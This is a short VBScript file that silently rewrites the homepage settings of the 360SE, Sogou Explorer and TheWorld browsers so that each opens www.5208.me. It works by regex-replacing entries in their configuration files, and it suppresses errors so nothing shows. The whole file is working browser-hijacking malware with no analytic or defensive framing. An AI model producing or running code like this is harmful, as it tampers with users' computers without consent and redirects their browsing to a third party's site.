on error resume next
DIM Fso,TxtFl,Str,re
Set Fso = CreateObject("Scripting.FileSystemObject")
Set TxtFl = Fso.OpenTextFile ("C:\Documents and Settings\Administrator\Application Data\360se\360SE.ini",1,False)
Set re = new RegExp
re.Pattern = "\s+HomePage=([\S\s]*?)\s+"
re.Global = true
re.IgnoreCase = true
Str = re.Replace ( TxtFl.ReadAll,vbNewLine+"HomePage=www.5208.me"+vbNewLine)
TxtFl.Close
Set TxtFl = Fso.OpenTextFile ("C:\Documents and Settings\Administrator\Application Data\360se\360SE.ini",2,False)
TxtFl.Write Str 
TxtFl.Close

Set TxtFl = Fso.OpenTextFile ("C:\Documents and Settings\Administrator\Application Data\SogouExplorer\Config.xml",1,True)
Set re = new RegExp
re.Pattern = "homepage=""([\S\s]*?)"""
re.Global = true
re.IgnoreCase = true
Str = re.Replace ( TxtFl.ReadAll,"homepage=""www.5208.me""")
re.Pattern = "homepagetype=""([\S\s]*?)"""
Str = re.Replace ( Str,"homepagetype=""3""")
TxtFl.Close
Set TxtFl = Fso.OpenTextFile ("C:\Documents and Settings\Administrator\Application Data\SogouExplorer\Config.xml",2,True)
TxtFl.Write Str 
TxtFl.Close

Set TxtFl = Fso.OpenTextFile ("C:\WINDOWS\TheWorld\TheWorld.ini",1,,-1)
Set re = new RegExp
re.Pattern = "\s+HomePage=([\S\s]*?)\s+"
re.Global = true
re.IgnoreCase = true
Str = re.Replace ( TxtFl.ReadAll,vbNewLine+" HomePage=http://www.5208.me"+vbNewLine)
TxtFl.Close
Set TxtFl = Fso.OpenTextFile ("C:\WINDOWS\TheWorld\TheWorld.ini",2,,-1)
TxtFl.Write Str 
TxtFl.Close
